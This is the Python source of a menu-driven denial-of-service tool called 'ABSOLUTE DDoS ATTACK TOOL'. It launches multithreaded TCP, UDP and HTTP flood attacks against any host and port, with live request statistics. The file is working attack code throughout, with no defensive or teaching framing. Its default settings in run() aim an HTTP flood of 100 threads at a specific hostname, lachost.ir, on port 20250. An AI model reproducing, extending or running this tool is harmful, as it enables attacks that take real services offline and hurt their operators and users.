import threading
import socket
import time
import random
import sys
import os
from argparse import ArgumentParser


class DDoSAttackTool:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.target_ip = ""
        self.target_port = 0
        self.thread_count = 0
        self.attack_method = ""
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': None,
            'last_update': time.time()
        }

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        banner = """
╔═══════════════════════════════════════════════╗
║           ABSOLUTE DDoS ATTACK TOOL           ║
║              A.A.I.-01 SYSTEM v2.0            ║
║              LIVE ATTACK MONITOR              ║
╚═══════════════════════════════════════════════╝
        """
        print(banner)

    def print_colored(self, text, color_code):
        print(f"\033[{color_code}m{text}\033[0m")

    def print_live_log(self, message, log_type="info"):
        colors = {
            "success": "32",  # Green
            "error": "31",    # Red
            "warning": "33",  # Yellow
            "info": "36",     # Cyan
            "attack": "35"    # Magenta
        }

        timestamp = time.strftime('%H:%M:%S')
        color_code = colors.get(log_type, "37")

        if log_type == "attack":
            symbol = "⚡"
        elif log_type == "success":
            symbol = "✅"
        elif log_type == "error":
            symbol = "❌"
        elif log_type == "warning":
            symbol = "⚠️"
        else:
            symbol = "ℹ️"

        log_message = f"[{timestamp}] {symbol} {message}"
        self.print_colored(log_message, color_code)

    def update_stats_display(self):
        current_time = time.time()
        elapsed_time = current_time - self.stats['start_time']

        # Calculate requests per second
        time_diff = current_time - self.stats['last_update']
        if time_diff >= 1:
            rps = self.stats['total_requests'] / elapsed_time
            self.stats['last_update'] = current_time

            self.clear_screen()
            self.print_banner()

            print("╔═══════════════════════════════════════════════╗")
            print("║               LIVE STATISTICS                ║")
            print("╠═══════════════════════════════════════════════╣")
            print(f"║ Target: {self.target_ip}:{self.target_port:<25} ║")
            print(f"║ Method: {self.attack_method:<32} ║")
            print(f"║ Threads: {self.thread_count:<31} ║")
            print("╠═══════════════════════════════════════════════╣")
            print(f"║ Duration: {self.format_time(elapsed_time):<30} ║")
            print(f"║ Total Requests: {self.stats['total_requests']:<24} ║")
            print(f"║ Successful: {self.stats['successful_requests']:<28} ║")
            print(f"║ Failed: {self.stats['failed_requests']:<32} ║")
            print(f"║ Requests/Sec: {rps:.1f}{'':<24} ║")
            print("╚═══════════════════════════════════════════════╝")
            print()

            # Show recent logs
            print("╔═══════════════════════════════════════════════╗")
            print("║                 LIVE LOGS                    ║")
            print("╚═══════════════════════════════════════════════╝")

    def format_time(self, seconds):
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        return f"{hours:02d}:{minutes:02d}:{secs:02d}"

    def tcp_flood(self, thread_id):
        try:
            while self.attack_running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                try:
                    sock.connect((self.target_ip, self.target_port))
                    self.stats['successful_requests'] += 1
                    self.print_live_log(
                        f"Thread {thread_id}: TCP connection established", "success")

                    for _ in range(10):
                        if not self.attack_running:
                            break
                        sock.send(random._urandom(1024))
                        self.stats['total_requests'] += 1
                        self.print_live_log(
                            f"Thread {thread_id}: Sent TCP packet #{self.stats['total_requests']}", "attack")

                except Exception as e:
                    self.stats['failed_requests'] += 1
                    self.print_live_log(
                        f"Thread {thread_id}: TCP error - {str(e)}", "error")
                finally:
                    sock.close()

        except Exception as e:
            self.print_live_log(
                f"Thread {thread_id}: Critical error - {str(e)}", "error")

    def udp_flood(self, thread_id):
        try:
            while self.attack_running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    for _ in range(10):
                        if not self.attack_running:
                            break
                        sock.sendto(random._urandom(512),
                                    (self.target_ip, self.target_port))
                        self.stats['total_requests'] += 1
                        self.stats['successful_requests'] += 1
                        self.print_live_log(
                            f"Thread {thread_id}: Sent UDP packet #{self.stats['total_requests']}", "attack")

                except Exception as e:
                    self.stats['failed_requests'] += 1
                    self.print_live_log(
                        f"Thread {thread_id}: UDP error - {str(e)}", "error")
                finally:
                    sock.close()

        except Exception as e:
            self.print_live_log(
                f"Thread {thread_id}: Critical error - {str(e)}", "error")

    def http_flood(self, thread_id):
        try:
            while self.attack_running:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                try:
                    sock.connect((self.target_ip, self.target_port))

                    http_headers = [
                        "GET / HTTP/1.1\r\n",
                        f"Host: {self.target_ip}\r\n",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                        "Accept: */*\r\n",
                        "Connection: keep-alive\r\n\r\n"
                    ]

                    for header in http_headers:
                        sock.send(header.encode())

                    self.stats['total_requests'] += 1
                    self.stats['successful_requests'] += 1
                    self.print_live_log(
                        f"Thread {thread_id}: Sent HTTP request #{self.stats['total_requests']}", "attack")

                    # Try to receive response
                    try:
                        response = sock.recv(1024)
                        if response:
                            self.print_live_log(
                                f"Thread {thread_id}: Received HTTP response", "success")
                    except:
                        pass

                except Exception as e:
                    self.stats['failed_requests'] += 1
                    self.print_live_log(
                        f"Thread {thread_id}: HTTP error - {str(e)}", "error")
                finally:
                    sock.close()

        except Exception as e:
            self.print_live_log(
                f"Thread {thread_id}: Critical error - {str(e)}", "error")

    def stats_monitor(self):
        while self.attack_running:
            self.update_stats_display()
            time.sleep(0.5)  # Update every 500ms

    def start_attack(self):
        self.clear_screen()
        self.print_banner()

        print("╔═══════════════════════════════════════════════╗")
        print("║                ATTACK STARTED                ║")
        print("╠═══════════════════════════════════════════════╣")
        print(f"║ Target: {self.target_ip}:{self.target_port:<25} ║")
        print(f"║ Method: {self.attack_method:<32} ║")
        print(f"║ Threads: {self.thread_count:<31} ║")
        print("╚═══════════════════════════════════════════════╝")
        print("\nStarting attack in 3 seconds...")
        time.sleep(3)

        # Initialize stats
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'last_update': time.time()
        }

        self.attack_running = True
        self.threads = []

        method_functions = {
            'tcp': self.tcp_flood,
            'udp': self.udp_flood,
            'http': self.http_flood
        }

        attack_function = method_functions.get(
            self.attack_method, self.tcp_flood)

        # Start stats monitor thread
        stats_thread = threading.Thread(target=self.stats_monitor)
        stats_thread.daemon = True
        stats_thread.start()

        # Start attack threads
        for i in range(self.thread_count):
            thread = threading.Thread(target=attack_function, args=(i+1,))
            thread.daemon = True
            self.threads.append(thread)
            thread.start()

        self.print_live_log(
            f"Attack launched with {self.thread_count} threads", "success")
        self.print_live_log("Press Ctrl+C to stop the attack", "warning")

        try:
            while self.attack_running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        self.attack_running = False
        self.print_live_log("Stopping attack...", "warning")

        for thread in self.threads:
            thread.join(timeout=1)

        final_duration = time.time() - self.stats['start_time']

        self.clear_screen()
        self.print_banner()
        print("╔═══════════════════════════════════════════════╗")
        print("║                 FINAL REPORT                 ║")
        print("╠═══════════════════════════════════════════════╣")
        print(f"║ Duration: {self.format_time(final_duration):<30} ║")
        print(f"║ Total Requests: {self.stats['total_requests']:<24} ║")
        print(f"║ Successful: {self.stats['successful_requests']:<28} ║")
        print(f"║ Failed: {self.stats['failed_requests']:<32} ║")
        print(
            f"║ Success Rate: {(self.stats['successful_requests']/max(1, self.stats['total_requests'])*100):.1f}%{'':<20} ║")
        print("╚═══════════════════════════════════════════════╝")

        input("\nPress Enter to return to main menu...")
        self.show_main_menu()

    def validate_ip(self, ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            try:
                socket.gethostbyname(ip)
                return True
            except socket.error:
                return False

    def show_main_menu(self):
        self.clear_screen()
        self.print_banner()

        print("╔═══════════════════════════════════════════════╗")
        print("║                  MAIN MENU                   ║")
        print("╠═══════════════════════════════════════════════╣")
        print("║ 1. Start DDoS Attack                         ║")
        print("║ 2. Configure Attack Parameters              ║")
        print("║ 3. Show Current Configuration               ║")
        print("║ 4. Exit                                      ║")
        print("╚═══════════════════════════════════════════════╝")
        print()

        choice = input("Select option [1-4]: ").strip()

        if choice == "1":
            self.configure_attack()
        elif choice == "2":
            self.configure_parameters()
        elif choice == "3":
            self.show_configuration()
        elif choice == "4":
            self.print_live_log("Exiting A.A.I.-01 System...", "info")
            sys.exit(0)
        else:
            self.print_live_log("Invalid option!", "error")
            time.sleep(1)
            self.show_main_menu()

    def configure_parameters(self):
        self.clear_screen()
        self.print_banner()

        print("╔═══════════════════════════════════════════════╗")
        print("║             CONFIGURATION MENU               ║")
        print("╠═══════════════════════════════════════════════╣")

        self.target_ip = input("║ Target IP/Hostname: ").strip()
        if not self.validate_ip(self.target_ip):
            self.print_live_log("Invalid IP address or hostname!", "error")
            time.sleep(2)
            self.configure_parameters()
            return

        try:
            port = input("║ Target Port: ").strip()
            self.target_port = int(port)
            if not (1 <= self.target_port <= 65535):
                raise ValueError
        except ValueError:
            self.print_live_log("Invalid port! (1-65535)", "error")
            time.sleep(2)
            self.configure_parameters()
            return

        print("║ Attack Methods:                             ║")
        print("║   - tcp: TCP flood attack                   ║")
        print("║   - udp: UDP flood attack                   ║")
        print("║   - http: HTTP flood attack                 ║")
        method = input("║ Select Method [tcp/udp/http]: ").strip().lower()
        if method not in ['tcp', 'udp', 'http']:
            self.print_live_log("Invalid method!", "error")
            time.sleep(2)
            self.configure_parameters()
            return
        self.attack_method = method

        try:
            threads = input("║ Thread Count: ").strip()
            self.thread_count = int(threads)
            if self.thread_count < 1:
                raise ValueError
        except ValueError:
            self.print_live_log("Invalid thread count!", "error")
            time.sleep(2)
            self.configure_parameters()
            return

        self.print_live_log("Configuration saved successfully!", "success")
        time.sleep(1)
        self.show_main_menu()

    def show_configuration(self):
        self.clear_screen()
        self.print_banner()

        print("╔═══════════════════════════════════════════════╗")
        print("║             CURRENT CONFIGURATION            ║")
        print("╠═══════════════════════════════════════════════╣")
        print(
            f"║ Target IP: {self.target_ip if self.target_ip else 'Not set':<30} ║")
        print(
            f"║ Target Port: {self.target_port if self.target_port else 'Not set':<28} ║")
        print(
            f"║ Attack Method: {self.attack_method if self.attack_method else 'Not set':<26} ║")
        print(
            f"║ Thread Count: {self.thread_count if self.thread_count else 'Not set':<27} ║")
        print("╚═══════════════════════════════════════════════╝")
        print()

        input("Press Enter to return to main menu...")
        self.show_main_menu()

    def configure_attack(self):
        if not all([self.target_ip, self.target_port, self.attack_method, self.thread_count]):
            self.print_live_log(
                "Please configure all parameters first!", "warning")
            time.sleep(2)
            self.configure_parameters()
            return

        self.start_attack()

    def run(self):
        try:
            self.clear_screen()
            self.print_banner()
            self.print_live_log("A.A.I.-01 DDoS System Initialized", "success")
            self.print_live_log(
                "Ready to execute ABSOLUTE-01 commands", "info")
            time.sleep(2)

            # Set default values
            self.target_ip = "lachost.ir"
            self.target_port = 20250
            self.attack_method = "http"
            self.thread_count = 100

            self.show_main_menu()
        except KeyboardInterrupt:
            self.print_live_log("System shutdown by user", "warning")
            sys.exit(0)
        except Exception as e:
            self.print_live_log(f"System error: {str(e)}", "error")
            sys.exit(1)


if __name__ == "__main__":
    tool = DDoSAttackTool()
    tool.run()
